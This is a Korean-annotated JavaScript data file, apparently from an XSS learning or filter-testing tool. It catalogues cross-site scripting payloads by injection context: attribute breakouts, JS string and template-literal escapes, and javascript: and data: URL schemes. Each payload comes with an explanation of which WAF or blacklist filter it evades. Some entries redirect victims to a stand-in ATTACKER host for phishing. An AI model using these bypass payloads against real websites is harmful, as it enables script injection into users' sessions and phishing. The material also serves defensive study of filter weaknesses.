      { id: 'waf-svg-onrandom-decoy', label: 'svg/onrandom (존재하지 않는 속성으로 WAF 패턴 흔들기)', text: '<svg/onrandom=random onload=confirm(1)>',
        principle: '실제 WAF 우회 사례 — 존재하지도 않는 임의의 on* 속성(onrandom)을 진짜 onload 앞에 끼워 넣어, "on* 속성은 딱 하나까지만 허용" 같은 단순 카운팅/패턴 매칭 규칙을 흔들어 통과시킨 적이 있다.' },
      { id: 'waf-svg-nbsp-entity', label: 'svg onload=&nbsp;alert... (HTML 엔티티 공백으로 공백 필터 우회)', text: '<svg onload=&nbsp;alert`1`+>',
        principle: '실제 WAF 우회 사례 — 일반 공백(0x20) 문자만 찾는 필터에 HTML 엔티티로 표현한 non-breaking space(&nbsp;)를 끼워, 브라우저는 공백으로 렌더링/파싱하지만 필터는 매칭 문자가 달라 통과시킨 적이 있다.' },
      { id: 'waf-dot-pipe-alert', label: '1|alert`` (파이프 연산자 뒤에 백틱 호출)', text: '1\'"><img/src/onerror=.1|alert``>',
        principle: '실제 WAF 우회 사례 — 숫자 리터럴과 비트 OR 연산자(|) 뒤에 괄호 없는 백틱 호출을 붙인, 흔치 않은 토큰 조합으로 시그니처 기반 탐지를 피해간 사례.' },
      { id: 'waf-details-ontoggle', label: '<details open ontoggle> (open 속성이 있으면 즉시 발동)', text: '<details%0aopen%0aontoggle%0a=%0aalert(1)>',
        principle: '실제 WAF 우회 사례 — 속성 구분자를 전부 %0a(개행)의 URL 인코딩으로 바꾸고, open 속성이 있는 <details> 가 렌더링되는 즉시 발동하는 ontoggle 을 사용해 "공백 1바이트만 보는" 탐지를 피한 사례.' },
      { id: 'waf-href-numeric-entity-single', label: 'a href=javas&#99;ript: (글자 하나만 엔티티로)', text: '<a href=javas&#99;ript:alert(1)>클릭</a>',
        principle: '실제 WAF 우회 사례 — "javascript:" 전체가 아니라 단 한 글자(c→&#99;)만 HTML 엔티티로 바꿔도 "javascript:" 라는 연속 문자열이 원문에서 사라져 우회에 성공한 사례. 브라우저는 속성값을 파싱하며 엔티티를 디코딩해 정상적으로 스킴을 인식한다.' },
      { id: 'waf-fortiweb-unicode-escape', label: '\\u003e\\u003c 로 꺾쇠 자체를 유니코드 이스케이프', text: "\\u003e\\u003ch1 onclick=alert('1')\\u003e",
        principle: '실제 WAF 우회 사례 — 이 값이 JS 문자열/속성 소스로 평가되는 지점에서, 꺾쇠(< >) 자체를 유니코드 이스케이프로 숨겨 "원문에 <, > 가 있는지"만 보는 필터를 통과한 뒤 런타임에 정상적인 태그로 복원된다.' },
      { id: 'onpointerrawupdate-overlay', label: 'onpointerrawupdate (고빈도 포인터 이벤트, 전체화면 오버레이)', text: '<xss onpointerrawupdate=alert(document.domain) style="display:block;position:fixed;width:100vw;height:100vh;left:0;top:0;z-index:99999">',
        principle: '일반 마우스 이동(onmousemove)보다도 더 세밀하게, 초당 수백 번까지 발생할 수 있는 신생 포인터 이벤트 — "onmousemove 정도만 아는" 이벤트 사전에서는 당연히 빠져 있다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'object-keys-index-alert', label: 'Object.keys(self) 순회로 함수명을 "이름"이 아닌 "인덱스"로 참조', text: '<xss tabindex=1 autofocus onfocus=self[Object.keys(self).find(k=>/^a[rel]+t$/.test(k))](1)>',
        principle: '"alert" 라는 글자를 어디에도 직접 쓰지 않고, 전역 객체의 키 목록을 순회해 정규식으로 이름이 맞는 속성을 찾아 그 결과로 호출한다 — func-blacklist 가 아무리 정교한 패턴을 써도 소스에 "alert" 연속 문자열 자체가 없으면 매칭할 수 없다는 한계를 보여준다.' },
      { id: 'waf-incapsula-globaleval-crlf', label: 'onload\\r\\n= + $.globalEval (CRLF로 속성 구분자 흔들기)', text: '<svg onload\r\n=$.globalEval("al"+"ert()")>',
        principle: '실제 WAF 우회 사례 — 속성명과 = 사이에 실제 CRLF(캐리지리턴+개행)를 끼워 넣고, 실행부도 jQuery의 $.globalEval 에 문자열 연결로 쪼갠 코드를 넘겨 func-blacklist 까지 함께 우회한 사례.' },
      { id: 'waf-cloudflare-tab-entities', label: 'j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon; (스킴 전체를 조각조각 엔티티로)', text: '<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;alert(document.domain)&rpar;">X</a>',
        principle: '실제 WAF 우회 사례 — "javascript:" 뿐 아니라 함수 호출의 괄호까지 전부 이름있는 HTML 엔티티(&Tab; &NewLine; &colon; &lpar; &rpar;)로 조각내 문자열 매칭을 철저히 피한 뒤, 브라우저가 속성값을 파싱하며 한 번에 전부 디코딩해 정상 실행시킨 사례.' },
      { id: 'object-data-base64-multisemicolon', label: 'data: 뒤에 세미콜론을 여러 개 끼워 MIME 파서 흔들기', text: "<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+'></object>",
        principle: '실제 WAF 우회 사례 — MIME 타입과 인코딩 사이에 세미콜론을 여러 개 반복해도 브라우저는 관대하게 파싱해 정상적으로 data: URI를 처리하지만, "text/html;base64," 같은 정확한 패턴만 찾는 필터는 매칭에 실패한 사례. base64 부분은 "<script>alert(document.domain)</script>".' },
      { id: 'title-attr-event-handler-hide', label: 'title 속성 안에 또 다른 태그를 인코딩해 숨기기 (댕글링 마크업 변형)', text: '<!-- ><img title="--><iframe/onload=alert(document.domain)>"> -->',
        principle: 'HTML 주석(<!-- -->) 안에 있는 것처럼 보이지만, 주석 안에서도 속성값 파싱 규칙이 먼저 적용되는 브라우저의 허용적인(lenient) 파싱 특성을 이용 — title 속성값 안에 닫는 주석(-->)과 새 태그를 함께 넣어, "주석 안이니 안전하다"고 판단하는 필터를 우회한다.' },
    ],
  },
  {
    id: 'attr-dq',
    label: 'HTML 속성값 (큰따옴표로 감싸짐)',
    hint: '<input value="HERE"> 처럼 큰따옴표 안에 반사될 때.',
    payloads: [
      { id: 'breakout-img', label: '" 로 닫고 새 태그 (img)', text: '"><img src=x onerror=alert(document.domain)>',
        principle: '큰따옴표를 닫고(`"`) 태그를 닫은(`>`) 뒤 새 태그를 주입 — 가장 기본적인 속성 이탈.' },
      { id: 'breakout-svg', label: '" 로 닫고 새 태그 (svg)', text: '"><svg onload=alert(document.domain)>',
        principle: 'img와 같은 원리의 대안 벡터.' },
      { id: 'same-tag-attr', label: '같은 태그에 속성만 추가 (탈출 없음)', text: '" autofocus onfocus=alert(document.domain) x="',
        principle: '태그를 닫지 않고 같은 태그 안에 새 속성(autofocus+onfocus)만 추가 — `<`/`>` 가 전혀 필요 없어서 꺾쇠 필터는 아예 무의미해진다. 필요한 건 여는/닫는 따옴표뿐.' },
      { id: 'same-tag-attr-mixedcase', label: '같은 태그 + 대소문자 혼용 핸들러', text: '" OnFocUs=alert(document.domain) autofocus x="',
        principle: '위 기법에 대소문자 혼용을 더해 "on 으로 시작하는 소문자 패턴"만 찾는 필터까지 같이 우회.' },
      { id: 'same-tag-attr-backtick', label: '같은 태그 + 괄호 없이 백틱 호출', text: '" autofocus onfocus=alert`1` x="',
        principle: '꺾쇠·괄호 둘 다 필요 없는 조합 — 남는 건 따옴표와 백틱뿐이라, 이 둘만 막혀도 완전히 죽는다는 걸 역으로 보여주는 예시.' },
      { id: 'onpointerenter-overlay', label: '" 닫지 않고 전체화면 투명 오버레이 + onpointerenter', text: '" onpointerenter=alert(document.domain) style=position:fixed;width:100vw;height:100vh;left:0;top:0;z-index:99999 x="',
        principle: '속성만 추가하는 탈출(same-tag-attr)에, 마우스가 페이지 "어디로든" 움직이기만 하면 발동하도록 요소를 화면 전체 크기 투명 레이어로 덮는 CSS를 더했다 — autofocus/클릭 둘 다 필요 없이 마우스만 움직이면 실행된다.' },
      { id: 'onauxclick-attr', label: 'onauxclick (가운데/우클릭 등 "보조" 클릭)', text: '" onauxclick=alert(document.domain) x="',
        principle: '좌클릭 전용 onclick 블랙리스트만 막는 필터라면, 마우스 가운데 버튼이나 우클릭 등 "보조 버튼" 클릭에 반응하는 onauxclick 은 사전에서 빠져 있을 수 있다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'split-literal-eval', label: "self['ev'+'al'] 로 eval 자체도 쪼개기", text: `" autofocus onfocus=self['ev'+'al']('al'+'ert(1)') x="`,
        principle: 'eval 과 alert 둘 다를 블랙리스트에 올린 필터라도, 두 함수명 모두 문자열 연결로 쪼개면 소스에는 "eval"/"alert" 라는 연속 문자열이 전혀 남지 않는다.' },
      { id: 'srcdoc-nested-iframe', label: '" 닫고 iframe srcdoc 안에 중첩 벡터 숨기기', text: '"><iframe srcdoc="<svg onload=alert(document.domain)>"></iframe>',
        principle: '바깥쪽 값만 훑는 단순 키워드 스캐너는 srcdoc 속성값 안쪽에 또 HTML이 들어있다는 걸 재귀적으로 디코딩하지 않는 경우가 많다 — iframe 안에서 완전히 새로운 HTML 문서가 파싱되며 그 안의 onload 가 실행된다.' },
      { id: 'breakout-marquee', label: '" 로 닫고 새 태그 (marquee onstart)', text: '"><marquee onstart=alert(document.domain)>XSS</marquee>',
        principle: 'img/svg 가 아닌 레거시 태그로 탈출 — "흔한 XSS 태그 몇 개만" 차단 목록에 올린 필터를 피해가는 대안.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'breakout-details-ontoggle', label: '" 로 닫고 새 태그 (details ontoggle, open과 함께 즉시 발동)', text: '"><details open ontoggle=alert(document.domain)>',
        principle: '<details open> 는 렌더링되는 즉시 열린 상태가 되어 ontoggle 이 바로 실행된다 — onload처럼 로드를 기다릴 필요조차 없다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'formaction-breakout', label: '" 로 닫고 formaction 삽입 (on* 핸들러 없음)', text: '"><form><button formaction=javascript:alert(document.domain)>XSS</button></form>',
        principle: '탈출 자체는 기본적인 "><태그> 방식이지만, 삽입하는 새 태그가 on* 핸들러를 전혀 쓰지 않는 formaction 기반이라는 점이 다르다 — on-attr 필터는 이 조합에서 아예 무의미해진다.' },
      { id: 'breakout-object-data', label: '" 로 닫고 <object data=javascript:>', text: '"><object data="javascript:alert(document.domain)">',
        principle: 'img/svg 보다 덜 알려진 <object> 로 탈출 — on* 핸들러도 전혀 필요 없이 data 속성 하나만으로 실행된다.' },
      { id: 'same-tag-onauxclick-dq', label: '같은 태그에 onauxclick 추가 (보조 클릭)', text: '" onauxclick=alert(document.domain) autofocus x="',
        principle: '좌클릭 전용 onclick 블랙리스트는 가운데/우클릭에 반응하는 onauxclick 을 놓치기 쉽다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
    ],
  },
  {
    id: 'attr-sq',
    label: 'HTML 속성값 (작은따옴표로 감싸짐)',
    hint: "<input value='HERE'> 처럼 작은따옴표 안에 반사될 때.",
    payloads: [
      { id: 'breakout-img', label: "' 로 닫고 새 태그 (img)", text: "'><img src=x onerror=alert(document.domain)>",
        principle: '작은따옴표를 닫고(`\'`) 태그를 닫은(`>`) 뒤 새 태그를 주입.' },
      { id: 'breakout-svg', label: "' 로 닫고 새 태그 (svg)", text: "'><svg onload=alert(document.domain)>",
        principle: 'img와 같은 원리의 대안 벡터.' },
      { id: 'same-tag-attr', label: '같은 태그에 속성만 추가 (탈출 없음)', text: "' autofocus onfocus=alert(document.domain) x='",
        principle: '태그를 닫지 않고 속성만 추가 — `<`/`>` 불필요, 필요한 건 여는/닫는 작은따옴표뿐.' },
      { id: 'same-tag-attr-mixedcase', label: '같은 태그 + 대소문자 혼용 핸들러', text: "' OnFocUs=alert(document.domain) autofocus x='",
        principle: '대소문자 혼용으로 소문자 전용 on* 필터까지 우회.' },
      { id: 'onpointerdown-overlay', label: "' 닫지 않고 전체화면 오버레이 + onpointerdown", text: "' onpointerdown=alert(document.domain) style=position:fixed;width:100vw;height:100vh;left:0;top:0;z-index:99999 x='",
        principle: 'attr-dq 의 오버레이 기법과 동일한 원리의 작은따옴표 버전 — 클릭 위치를 가리지 않고 페이지 어디를 눌러도 발동한다.' },
      { id: 'split-literal-alert-sq', label: "self['a'+'lert'] — 작은따옴표 컨텍스트 버전", text: "' autofocus onfocus=self['a'+'lert'](1) x='",
        principle: 'func-blacklist 가 "alert" 연속 문자열만 찾는다면, 작은따옴표 속성 컨텍스트에서도 문자열 연결로 쪼개는 동일한 기법이 그대로 통한다.' },
      { id: 'breakout-formaction-sq', label: "' 로 닫고 formaction 삽입 (on* 핸들러 없음)", text: "'><form><button formaction=javascript:alert(document.domain)>XSS</button></form>",
        principle: '작은따옴표 탈출 + on* 핸들러를 전혀 쓰지 않는 formaction 조합 — attr-dq 쪽과 동일한 원리.' },
      { id: 'same-tag-ontouchstart-sq', label: '같은 태그에 ontouchstart 추가 (모바일 터치)', text: "' ontouchstart=alert(document.domain) autofocus x='",
        principle: '모바일 환경 전용 터치 이벤트 — 데스크톱 클릭/포커스 위주 이벤트 사전에서 빠지기 쉽다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'breakout-object-data-sq', label: "' 로 닫고 <object data=javascript:>", text: "'><object data='javascript:alert(document.domain)'>",
        principle: 'attr-dq 쪽과 동일한 object data 기반 탈출의 작은따옴표 버전.' },
      { id: 'split-literal-eval-sq', label: "self['ev'+'al'] — 작은따옴표 컨텍스트에서 eval도 분해", text: "' autofocus onfocus=self['ev'+'al']('al'+'ert(1)') x='",
        principle: 'eval 과 alert 를 둘 다 블랙리스트에 올린 경우에도, 작은따옴표 속성 컨텍스트에서 두 함수명 모두 문자열 연결로 쪼개면 그대로 통한다.' },
    ],
  },
  {
    id: 'attr-unquoted',
    label: 'HTML 속성값 (따옴표 없음)',
    hint: '<input value=HERE> 처럼 아예 따옴표 없이 반사될 때.',
    payloads: [
      { id: 'space-newattr', label: '공백으로 새 속성 주입', text: ' onerror=alert(document.domain) autofocus x=',
        principle: '애초에 따옴표가 없는 컨텍스트라 탈출에 `"`/`\'` 자체가 필요 없음 — 공백 하나만으로 같은 태그에 새 속성을 추가한다. 따옴표 필터는 여기선 처음부터 무의미.' },
      { id: 'slash-newattr', label: '/ 로 새 속성 주입 (공백 대체)', text: '/onerror=alert(document.domain)/autofocus/',
        principle: '구분자로 공백 대신 `/` 사용 — 공백(0x20) 문자만 찾아 제거/축약하는 필터를 우회.' },
      { id: 'mixedcase-newattr', label: '대소문자 혼용 핸들러', text: ' OnErRor=alert(document.domain) autofocus x=',
        principle: '소문자 on* 패턴만 찾는 case-sensitive 필터 우회.' },
      { id: 'backtick-newattr', label: '괄호 없이 백틱 호출', text: ' onerror=alert`1` autofocus x=',
        principle: '꺾쇠·따옴표 둘 다 불필요한 컨텍스트에서 괄호까지 제거한 조합.' },
      { id: 'onwheel-newattr', label: 'onwheel (휠 스크롤만으로 실행, 공백 구분자)', text: ' onwheel=alert(document.domain) autofocus x=',
        principle: '마우스 휠을 굴리기만 해도 발동 — 클릭/포커스 이동 없이 트리거되는 또 다른 "저관여" 이벤트 계열이고, 흔한 이벤트 사전에서 빠지기 쉽다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'ontouchstart-newattr', label: 'ontouchstart (모바일 터치 전용 이벤트)', text: '/ontouchstart=alert(document.domain)/autofocus/',
        principle: '데스크톱 클릭/포커스 이벤트 위주로 짜인 필터는 모바일 터치 이벤트(ontouchstart)를 깜빡 빠뜨리기 쉽다 — 구분자도 공백 대신 / 를 써서 공백 필터까지 같이 우회.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'bracket-concat-newattr', label: "window['a'+'lert'] — 따옴표 없는 컨텍스트 버전", text: " onerror=window['a'+'lert'](1) autofocus x=",
        principle: '이 컨텍스트에서도 func-blacklist 우회에는 동일하게 문자열 연결 분해가 통한다 — 꺾쇠/따옴표가 필요 없는 컨텍스트라는 전제는 그대로 유지된다.' },
      { id: 'onauxclick-newattr', label: 'onauxclick 새 속성 주입 (보조 클릭)', text: ' onauxclick=alert(document.domain) autofocus x=',
        principle: '좌클릭(onclick) 전용 필터는 가운데/우클릭 등 보조 버튼 클릭에 반응하는 onauxclick 을 놓치기 쉽다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'formaction-unquoted', label: 'formaction 추가 (on* 핸들러 없음, 따옴표도 불필요)', text: ' formaction=javascript:alert(document.domain) autofocus x=',
        principle: '따옴표도 on* 핸들러도 전혀 필요 없는 조합 — form 요소 안에서 버튼으로 동작할 수 있는 컨텍스트라는 전제가 맞아야 한다.' },
      { id: 'backtick-concat-newattr', label: "self['a'+'lert'] + 백틱 호출 (괄호·따옴표 필터 동시 우회)", text: ' onerror=self[`a`+`lert`]`1` autofocus x=',
        principle: '문자열 연결을 작은따옴표 대신 백틱으로 하고, 호출도 태그드 템플릿(백틱) 방식으로 해서 — 따옴표 필터와 괄호 필터, func-blacklist 세 가지를 동시에 피해가는 조합.' },
      { id: 'nullbyte-before-equals', label: 'onerror 뒤, = 앞에 NUL 바이트 삽입', text: ' onerror\x00=alert(document.domain) autofocus x=',
        principle: '속성명과 = 사이에 "공백(\\s)"만 허용하는 정규식(on[a-z]+\\s*=)은 NUL(0x00) 같은 비-공백 제어 바이트를 핸들러로 인식하지 못해 매칭에 실패한다 — 그런데도 브라우저의 HTML 파서는 관대하게(lenient) 이를 건너뛰고 정상적인 onerror 속성으로 처리해버린다.' },
    ],
  },
  {
    id: 'js-string',
    label: '<script> 내부 JS 문자열 리터럴',
    hint: 'var x = "HERE"; 처럼 이미 <script> 블록 안, 문자열 리터럴 안에 반사될 때.',
    payloads: [
      { id: 'dq-breakout', label: '" 닫고 statement 주입', text: '";alert(document.domain);//',
        principle: '큰따옴표로 문자열을 닫고 세미콜론으로 문장을 끝낸 뒤 새 statement 주입, `//` 로 뒤에 남는 원본 코드를 주석 처리.' },
      { id: 'sq-breakout', label: "' 닫고 statement 주입", text: "';alert(document.domain);//",
        principle: '작은따옴표 버전 — 반사되는 리터럴이 어느 따옴표를 쓰는지에 맞춰 선택.' },
      { id: 'concat-breakout', label: '세미콜론 없이 문자열 연결로 주입', text: '"+alert(document.domain)+"',
        principle: '세미콜론 대신 `+` 연산자로 표현식 중간에 함수 호출을 끼워 넣는다 — alert()의 반환값(undefined)과 문자열을 이어붙이는 과정에서 호출은 그대로 실행된다. 세미콜론 제거 필터 우회.' },
      { id: 'backtick-breakout', label: '괄호 없이 백틱 호출', text: '";alert`1`;//',
        principle: '문자열 탈출은 그대로 하되 실행부만 괄호 없는 백틱 호출로 교체.' },
      { id: 'alt-redirect-location', label: '세미콜론 뒤에 alert 대신 location 리다이렉트', text: '";document.location="https://ATTACKER";//',
        principle: 'func-blacklist 가 alert/eval/prompt/confirm 네 개만 막아도, location 대입을 통한 리다이렉트는 그 목록에 없는 경우가 많다 — 팝업 없이도 피싱/오픈 리다이렉트로 공격이 성립됨을 보여준다.' },
      { id: 'bracket-concat-eval', label: "window['eval'] 대신 window['ev'+'al'] 로 분해", text: `";window['ev'+'al']('al'+'ert(document.domain)');//`,
        principle: '문자열 리터럴을 닫고 statement를 주입하는 기본 틀은 그대로 두고, 실행부의 함수명(eval/alert)만 전부 문자열 연결로 쪼개 func-blacklist를 우회한다.' },
      { id: 'charcode-breakout', label: 'String.fromCharCode 로 함수명 자체를 생성', text: '";self[String.fromCharCode(97,108,101,114,116)](document.domain);//',
        principle: '문자 코드로부터 런타임에 "alert" 문자열을 조립 — 소스에는 해당 글자가 연속으로 등장하지 않는다.' },
      { id: 'throw-onerror-trick', label: 'throw 로 세미콜론·괄호 둘 다 없이 실행 (onerror 재활용)', text: '";throw onerror=alert,document.domain;//',
        principle: '문자열을 닫은 뒤, onerror 전역 핸들러에 alert 함수 자체(참조)를 대입하고 콤마 연산자로 두 번째 값을 "에러 메시지"처럼 넘긴다 — throw 가 처리되지 않은 예외를 던지면 방금 등록한 onerror 핸들러가 즉시 호출되며, 결과적으로 alert(document.domain) 과 동등한 효과를 낸다. 함수 호출 괄호 자체가 아예 없다.' },
      { id: 'comma-operator-breakout', label: '세미콜론 대신 콤마 연산자로 문장 잇기', text: '";0,alert(document.domain);//',
        principle: '세미콜론이 제거돼도 콤마 연산자로 여러 표현식을 하나의 문장처럼 이어 쓸 수 있다 — concat-breakout(문자열 덧셈)과 같은 목적의 또 다른 "세미콜론 없이 잇기" 변형.' },
      { id: 'bitwise-or-breakout', label: '비트 OR 연산자로 세미콜론 없이 잇기', text: '"|alert(document.domain)|"',
        principle: '세미콜론·콤마가 모두 막혀도 비트 OR(|) 같은 이항 연산자 사이에 함수 호출을 끼워 넣을 수 있다 — 연산 결과 자체는 의미 없고, 평가 과정에서 호출이 실행된다는 점만 이용한다.' },
      { id: 'alternate-redirect-forms', label: 'alert 대신 여러 방식의 리다이렉트로 func-blacklist 우회', text: `";window['location']['href']='https://ATTACKER';//`,
        principle: 'func-blacklist 가 location 대입까지는 막지 않는 경우가 많다 — 브래킷 표기로 한 번 더 감싸 "location.href=" 같은 흔한 패턴 매칭까지 피하면서 오픈 리다이렉트를 수행한다.' },
      { id: 'setinterval-string-concat', label: "setInterval('ale'+'rt(1)') 로도 동일하게", text: `";setInterval('ale'+'rt(document.domain)');//`,
        principle: 'setTimeout 뿐 아니라 setInterval 도 문자열 인자를 받으면 eval 과 동일하게 동작한다 — 둘 중 하나만 블랙리스트에 있다면 나머지로 우회 가능.' },
    ],
  },
  {
    id: 'js-template',
    label: 'JS 템플릿 리터럴 (백틱 `...` 안)',
    hint: '`HERE` 처럼 백틱으로 감싸인 템플릿 리터럴 안에 반사될 때.',
    payloads: [
      { id: 'substitution', label: '${} 치환식으로 즉시 실행', text: '${alert(document.domain)}',
        principle: '템플릿 리터럴의 치환식(`${}`)은 꺾쇠·따옴표·백틱 탈출 없이 그 자체로 JS 표현식으로 평가된다 — HTML 관련 필터 전부와 무관하게, 이 컨텍스트 자체가 사실상 직통 실행 경로.' },
      { id: 'substitution-backtick', label: '${} 안에서 괄호 없이 백틱 호출', text: '${alert`1`}',
        principle: '치환식 안의 함수 호출까지 괄호 없는 형태로 — 단 이 경우 백틱 자체가 필요해서 backtick-strip 필터에는 걸린다.' },
      { id: 'full-breakout', label: '백틱을 닫고 완전히 탈출', text: '`;alert(document.domain);//',
        principle: '치환식이 아니라 리터럴 자체를 닫는(백틱) 방식 — js-string 탈출과 동일한 원리이지만 닫는 문자가 백틱이라, 백틱이 막히면 역시 탈출 불가.' },
      { id: 'substitution-bracket-concat', label: '${} 안에서도 함수명 문자열 연결로 분해', text: "${window['a'+'lert'](document.domain)}",
        principle: '템플릿 리터럴 치환식은 애초에 꺾쇠·따옴표·백틱 탈출이 필요 없는 직통 실행 경로인데, 여기에 func-blacklist 우회용 문자열 분해까지 더하면 키워드 기반 필터 두 종류를 동시에 피해간다.' },
      { id: 'substitution-throw-onerror', label: '${} 안에서 throw+onerror 조합 (괄호 없이)', text: '${throw onerror=alert,document.domain}',
        principle: '치환식 안에서도 js-string 컨텍스트의 throw/onerror 재활용 기법이 그대로 성립한다 — 단, 치환식은 "표현식" 이어야 하므로 throw 문이 실제로 유효한 위치인지는 구현에 따라 다르다는 제약이 있다.' },
      { id: 'full-breakout-formaction', label: '백틱을 닫고 formaction 기반 삽입', text: '`;document.write("<form><button formaction=javascript:alert(document.domain)>x</button></form>");//',
        principle: '백틱 탈출 뒤 document.write 로 on* 핸들러 없는 formaction 벡터를 추가로 삽입 — on-attr 필터가 있어도 삽입된 결과물 자체는 그 필터를 거치지 않는 경우가 있다는 걸 보여준다.' },
      { id: 'substitution-bitwise-or', label: '${} 안에서 비트 OR로 세미콜론 없이', text: '${0|alert(document.domain)|0}',
        principle: '치환식은 "하나의 표현식"만 들어갈 수 있는데, 세미콜론으로 문장을 나눌 필요 없이 비트 연산자 하나로 표현식 전체를 구성해 그 안에 호출을 끼워 넣을 수 있다.' },
    ],
  },
  {
    id: 'url-attr',
    label: 'URL 속성 (href / src 값 자체)',
    hint: '<a href="HERE">, <iframe src="HERE"> 처럼 반사되는 값이 애초에 URL 속성 전체일 때 — 탈출 문자 없이 스킴만 바꾸면 끝나는 경우가 많다.',
    payloads: [
      { id: 'js-scheme', label: 'javascript: 스킴', text: 'javascript:alert(document.domain)',
        principle: '속성 자체가 href/src 라면 탈출 문자가 전혀 필요 없다 — `<`, `>`, 따옴표 모두 불필요, 스킴만 javascript: 로. 단 <a>는 클릭이 필요하고 최신 브라우저는 img/iframe의 src에서 javascript:를 실행하지 않는다.' },
      { id: 'js-scheme-mixedcase', label: 'javascript: 스킴 (대소문자 혼용)', text: 'JaVaScRiPt:alert(document.domain)',
        principle: 'URL 스킴은 대소문자를 구분하지 않아 브라우저는 그대로 인식 — 정확히 소문자 "javascript:" 만 찾는 필터를 우회.' },
      { id: 'data-uri', label: 'data: URI (HTML 삽입)', text: 'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+',
        principle: 'javascript: 스킴 전용 필터는 피하지만, iframe src 등에서만 의미가 있고 결과 realm이 opaque origin이라 쿠키/동일 출처 DOM에는 접근 못 한다(디페이스·피싱용). base64 부분은 "<script>alert(document.domain)</script>".' },
      { id: 'protocol-relative', label: '프로토콜 상대 경로로 원격 이전', text: '//ATTACKER/phish',
        principle: '스킴 없이 `//` 만으로 외부 호스트로 이동 — javascript:/data: 전용 필터를 우회하지만 도메인 화이트리스트 검사에는 걸린다.' },
      { id: 'js-scheme-entity-colon', label: 'javascript&colon; — 콜론을 HTML 엔티티로', text: 'javascript&colon;alert(document.domain)',
        principle: '브라우저가 URL을 파싱하기 전에 HTML 엔티티를 먼저 디코딩하므로 &colon; 은 실행 시점에는 그냥 : 가 된다 — 그러나 서버로 전달되는 원문 바이트에는 "javascript:" 라는 연속 문자열 자체가 없어 단순 텍스트 매칭 기반 javascript: 필터를 통과한다.' },
      { id: 'js-scheme-tab-entity', label: 'java&Tab;script: — 스킴 중간에 탭 엔티티 삽입', text: 'java&Tab;script:alert(document.domain)',
        principle: 'HTML 엔티티로 표현한 탭 문자를 "javascript" 단어 중간에 끼워 넣는다 — 디코딩 후에는 브라우저가 공백류 문자를 무시하고 정상적인 스킴으로 인식하지만, 원문에는 "javascript:" 연속 문자열이 없다.' },
      { id: 'js-scheme-decimal-entity', label: 'javascript&#58; — 콜론을 10진수 엔티티로', text: 'javascript&#58;alert(document.domain)',
        principle: '콜론 하나만 10진수 HTML 엔티티로 바꿔도 같은 효과 — &colon; 같은 이름있는 엔티티만 찾는 필터라면 숫자 엔티티는 빠뜨리기 쉽다.' },
      { id: 'js-scheme-hex-entity', label: 'javascript&#x3a; — 콜론을 16진수 엔티티로', text: 'javascript&#x3a;alert(document.domain)',
        principle: '같은 콜론 우회를 16진수 엔티티로 — 10진수만 걸러내는 필터가 있다면 이것으로 우회된다.' },
      { id: 'js-scheme-ctrl-char', label: '제어문자 하나를 스킴 앞에 (HTML 엔티티)', text: '&#9;javascript:alert(document.domain)',
        principle: '스킴 앞에 탭 등 제어문자를 하나 끼워 넣어도 브라우저의 URL 파서는 선행 공백류 문자를 건너뛰고 그대로 javascript: 로 인식한다 — "문자열이 javascript: 로 시작하는지"만 보는 필터를 우회.' },
      { id: 'js-scheme-percent-tab', label: '%09javascript: — URL 인코딩된 탭을 스킴 앞에', text: '%09javascript:alert(document.domain)',
        principle: '엔티티가 아니라 퍼센트 인코딩(%09=탭)으로도 동일한 효과 — 반사되는 지점이 URL 디코딩 후 검사되는지 전인지에 따라 둘 중 하나가 통한다.' },
      { id: 'js-scheme-tab-raw', label: 'java + 실제 탭문자 + script: (원문자 그대로)', text: 'java\tscript:alert(document.domain)',
        principle: '엔티티나 퍼센트 인코딩이 아니라 원문에 진짜 탭 문자(0x09)를 그대로 끼워 넣는 경우 — 값이 이미 디코딩된 채로 반사되는 컨텍스트에서 특히 유효하다.' },
      { id: 'js-scheme-newline-raw', label: 'java + 실제 개행문자 + script: (원문자 그대로)', text: 'java\nscript:alert(document.domain)',
        principle: '탭과 동일한 원리의 개행문자(0x0A) 버전.' },
      { id: 'data-js-base64-script-src', label: 'data: URI로 외부 스크립트처럼 로드 (base64)', text: 'data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==',
        principle: 'javascript: 스킴 전용 필터는 피해가지만 data: 자체는 여전히 남아있어 src-whitelist 검사(특히 data: 스킴 차단)에는 그대로 걸린다. base64 부분은 "alert(document.domain)".' },
      { id: 'js-scheme-double-slash-comment', label: 'javascript://%0a — // 뒤를 주석으로, 개행 뒤에 진짜 코드', text: 'javascript://%0aalert(document.domain)',
        principle: 'javascript: 다음에 오는 // 는 "빈 프로토콜 상대 경로처럼" 보여서 안전하다고 오판하기 쉽지만, JS 입장에서는 그냥 한 줄 주석 시작 기호다 — %0a(개행) 뒤에 실제 실행 코드를 이어 붙이면 주석이 끝나고 그 코드가 그대로 실행된다.' },
